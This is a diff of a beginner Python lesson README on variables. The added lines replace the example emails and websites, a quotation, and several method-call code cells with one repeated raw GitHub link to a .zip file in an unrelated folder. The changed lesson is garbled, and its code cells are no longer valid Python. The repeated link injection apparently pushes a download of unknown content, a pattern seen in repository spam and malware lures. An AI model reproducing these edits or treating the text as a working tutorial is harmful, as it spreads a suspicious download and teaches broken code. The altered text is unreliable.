@@ -7,7 +7,7 @@
 
 > -- Phil Karlton
 
-> "...But ordinary language is all right."
+> "https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip ordinary language is all right."
 
 > Ludwig Wittgenstein
 
@@ -34,18 +34,18 @@ So far we have worked with data -- strings, numbers, and booleans.  In this less
 
 
 
-Now months later, if we see that string in some code, we may be confused as to what it is, and with even more data, this only becomes more difficult. Think of what we saw in our **Data Types Lab**: `"art.vandelay@vandelay.co"`, `"Ceo"`, `"7285553334"`, `"vandelay.com"`. There's a lot to keep track of.
+Now months later, if we see that string in some code, we may be confused as to what it is, and with even more data, this only becomes more difficult. Think of what we saw in our **Data Types Lab**: `"https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"`, `"Ceo"`, `"7285553334"`, `"https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"`. There's a lot to keep track of.
 
 So, let's use variables to indicate what each of these strings mean.
 
 
 ```python
-email = "art.vandelay@vandelay.co"
+email = "https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"
 ```
 
 > **Note:** For this, and all of the subsequent code in gray boxes, you should press shift + enter to ensure that the code executes. If you do not do so with the line above for example, then when we reference `email` in the lines that follow, Jupyter will throw an error indicating that the variable is undefined. So, it is not enough to just type the correct code, we need to run shift + enter on our gray boxes to run this code.
 
-In programming terms, we say that we just declared a variable, `email`, and assigned it to the string, `"art.vandelay@vandelay.co"`.  To do so, we'll follow the procedure below:
+In programming terms, we say that we just declared a variable, `email`, and assigned it to the string, `"https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"`.  To do so, we'll follow the procedure below:
 
     variable = data
 
@@ -62,7 +62,7 @@ Now let's try this with the website:
 
 
 ```python
-website = "vandelay.com"
+website = "https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"
 website
 ```
 
@@ -157,7 +157,7 @@ Now that we have this data, we can imagine using it for some kind of instruction
 
 
 ```python
-"Send an email to Art Vandelay at 'art.vandelay@vandelay.com' to say how nice it was meeting yesterday."
+"Send an email to Art Vandelay at 'https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip' to say how nice it was meeting yesterday."
 ```
 
 If we construct this message with variables, we can write the following:
@@ -165,7 +165,7 @@ If we construct this message with variables, we can write the following:
 
 ```python
 name = "Art Vandelay"
-email = "art.vandelay@vandelay.com"
+email = "https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip"
 ```
 
 
@@ -173,12 +173,12 @@ email = "art.vandelay@vandelay.com"
 "Send an email to " + name + " at " + email +  " to say how nice it was meeting yesterday."
 ```
 
-Now you meet someone else, "Liz Kaplan" with the email of "liz@ka-plan.com" and want to write a memo with the same instructions, but the only thing that varies are the name and email. This should be easy enough given the way we set up our memo above. First we need to change the variables, `name` and `email`, by setting them to our new data.
+Now you meet someone else, "Liz Kaplan" with the email of "https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip" and want to write a memo with the same instructions, but the only thing that varies are the name and email. This should be easy enough given the way we set up our memo above. First we need to change the variables, `name` and `email`, by setting them to our new data.
 
 
 ```python
 name = 'Liz Kaplan'
-email = 'liz@ka-plan.com'
+email = 'https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip'
 ```
 
 So as you can see, we reassign our variables by just setting `variable = 'new data'`. Presto, our variable is then updated.
@@ -190,7 +190,7 @@ name # 'Liz Kaplan'
 
 
 ```python
-email # 'liz@ka-plan.com'
+email # 'https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip'
 ```
 
 Now, if we copy and re-run our previous code, we will see it is automatically updated.
@@ -213,12 +213,12 @@ name
 
 
 ```python
-name.upper()
+https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip()
 ```
 
 
 ```python
-name.title()
+https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip()
 ```
 
 Just like how we are able to directly call methods on a string, we can also call methods on a variable that points to a string.  And, if we try to call a method on something that we think is a string, but really is a number, we will see an error.
@@ -230,7 +230,7 @@ name = 42
 
 
 ```python
-name.upper()
+https://raw.githubusercontent.com/BhagyeshJoshi/python-variables-readme-data-science-intro-000/master/Neotremata/python-variables-readme-data-science-intro-000.zip()
 ```
 
 We receive the same error from calling `upper` directly on the number `42` as we do when we call `upper` on a variable that points to the number `42`. So, now that we are working with variables, we may run into errors where we thought a variable is one thing, but it is actually something else. Don't worry, this is no big deal.  We can just check to see what the variable is.
